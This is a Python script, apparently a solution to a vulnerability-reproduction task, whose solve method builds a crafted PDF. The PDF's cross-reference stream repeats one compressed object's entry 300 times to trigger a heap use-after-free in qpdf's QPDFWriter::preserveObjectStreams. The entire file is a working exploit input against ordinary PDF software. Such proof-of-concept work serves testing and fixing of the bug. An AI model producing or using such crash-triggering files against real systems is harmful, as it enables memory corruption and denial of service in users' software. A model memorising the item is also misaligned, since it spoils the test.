import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a PDF that triggers a Heap Use After Free in QPDFWriter::preserveObjectStreams
        # caused by multiple XRef entries for the same object ID.
        
        # Basic PDF Structure
        pdf_header = b"%PDF-1.7\n%\x80\x81\x82\x83\n"
        
        # Object 1: Catalog
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        
        # Object 2: Pages
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Object 3: Page
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
        
        # Object 4: Object Stream containing Object 5
        # The content of the object stream must define object 5.
        # "5 0" is the pair (obj_num, offset_in_first). "<<" is start of dict.
        stm_content = b"5 0 << >>"
        obj4 = b"4 0 obj\n<< /Type /ObjStm /N 1 /First 4 >>\nstream\n" + stm_content + b"\nendstream\nendobj\n"
        
        # Calculating offsets for the objects
        base_offset = len(pdf_header)
        off1 = base_offset
        off2 = off1 + len(obj1)
        off3 = off2 + len(obj2)
        off4 = off3 + len(obj3)
        off6 = off4 + len(obj4) # Object 6 (XRef) follows Object 4
        
        # Constructing the XRef Stream (Object 6)
        # We define IDs 0-6 normally.
        # Then we add many duplicate entries for ID 5 to trigger the vulnerability.
        
        # XRef Stream Fields: W [1 2 1] (Type, Offset/ObjNum, Gen/Index)
        
        # Base Rows
        rows = bytearray()
        # ID 0: Free
        rows += b'\x00\x00\x00\x00'
        # ID 1: Offset off1
        rows += b'\x01' + off1.to_bytes(2, 'big') + b'\x00'
        # ID 2: Offset off2
        rows += b'\x01' + off2.to_bytes(2, 'big') + b'\x00'
        # ID 3: Offset off3
        rows += b'\x01' + off3.to_bytes(2, 'big') + b'\x00'
        # ID 4: Offset off4
        rows += b'\x01' + off4.to_bytes(2, 'big') + b'\x00'
        # ID 5: Compressed in ObjStm 4, Index 0
        rows += b'\x02\x00\x04\x00'
        # ID 6: Offset off6
        rows += b'\x01' + off6.to_bytes(2, 'big') + b'\x00'
        
        # Base Index: [0 7] (IDs 0 to 6)
        index_list = [0, 7]
        
        # Adding duplicates for ID 5
        # We add 300 duplicates. This ensures multiple entries logic is exercised.
        # Each duplicate is an entry in the XRef stream data and a range in /Index.
        # Duplicate Row: Pointing to ObjStm 4 again.
        dup_row = b'\x02\x00\x04\x00'
        
        num_duplicates = 300
        for _ in range(num_duplicates):
            index_list.extend([5, 1])
            rows += dup_row
            
        # Serialize Index array
        index_str = " ".join(map(str, index_list)).encode()
        
        # Construct Object 6
        obj6_dict = (b"6 0 obj\n<< /Type /XRef /Size 7 /W [1 2 1] /Index [" + 
                     index_str + b"] /Root 1 0 R /Length " + 
                     str(len(rows)).encode() + b" >>\nstream\n")
        
        obj6 = obj6_dict + rows + b"\nendstream\nendobj\n"
        
        # Trailer
        trailer = b"startxref\n" + str(off6).encode() + b"\n%%EOF\n"
        
        return pdf_header + obj1 + obj2 + obj3 + obj4 + obj6 + trailer